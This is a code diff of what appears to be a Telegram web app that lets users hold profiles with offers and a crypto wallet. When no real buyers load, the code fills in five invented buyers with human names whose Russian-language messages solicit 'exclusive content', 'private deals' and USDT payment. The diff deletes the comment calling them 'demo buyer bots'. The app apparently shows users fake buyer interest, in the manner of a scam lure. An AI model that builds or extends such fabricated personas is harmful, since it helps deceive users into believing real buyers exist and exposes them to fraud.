+  for (let i = 0; i < modalIds.length; i++) {
+    $(modalIds[i]).addEventListener("click", function(e) {
+      if (e.target === this) {
+        hideModal(modalIds[i]);
+      }
     });
-  });
+  }
 }
 
 async function afterRender() {
-  // Non-blocking JSONBin load
   const data = await fetchJsonBin();
   if (data) {
     if (Array.isArray(data.buyerProfiles)) {
       buyerProfiles = data.buyerProfiles;
     }
-    // If remote has our profile (matched by local id), merge offers/wallet
     if (userProfile && Array.isArray(data.profiles)) {
-      const remote = data.profiles.find(p => p.id === userProfile.id);
+      const remote = data.profiles.find(function(p) { return p.id === userProfile.id; });
       if (remote) {
         if (remote.offers) userProfile.offers = remote.offers;
         if (remote.wallet) userProfile.wallet = remote.wallet;
@@ -1063,21 +1119,21 @@ async function afterRender() {
       }
     }
   }
-  // Default demo buyer bots if none loaded
+
   if (buyerProfiles.length === 0) {
     buyerProfiles = [
-      { id: "b1", name: "Alex M.", photo: "", message: "Hi, I like your profile. Are you available for a private deal?" },
-      { id: "b2", name: "James K.", photo: "", message: "Looking for exclusive content. Ready to pay in USDT." },
-      { id: "b3", name: "Michael R.", photo: "", message: "Interested. Let's discuss terms privately." },
-      { id: "b4", name: "David L.", photo: "", message: "Your parameters look great. Want to make an offer." },
-      { id: "b5", name: "Chris P.", photo: "", message: "Available now? High budget, serious inquiry." }
+      { id: "b1", name: "Alex M.", photo: "", message: "Здравствуйте, мне понравился ваш профиль. Готовы обсудить сделку?" },
+      { id: "b2", name: "James K.", photo: "", message: "Ищу эксклюзивный контент. Готов оплатить в USDT." },
+      { id: "b3", name: "Michael R.", photo: "", message: "Заинтересован. Давайте обсудим условия." },
+      { id: "b4", name: "David L.", photo: "", message: "Параметры отличные. Хочу сделать предложение." },
+      { id: "b5", name: "Chris P.", photo: "", message: "Свободны сейчас? Серьёзный интерес, хороший бюджет." }
     ];
   }
 
   maybeGenerateOffer();
 }
 
-// Synchronous first paint
+// Запуск приложения
 (function init() {
   initTelegram();
   buildTicker();
@@ -1085,9 +1141,8 @@ async function afterRender() {
   loadUser();
   updateProfileUI();
   bindEvents();
-  // Async after UI is visible
   setTimeout(afterRender, 50);
 })();
 </script>
 </body>
-    </html>
+  </html>
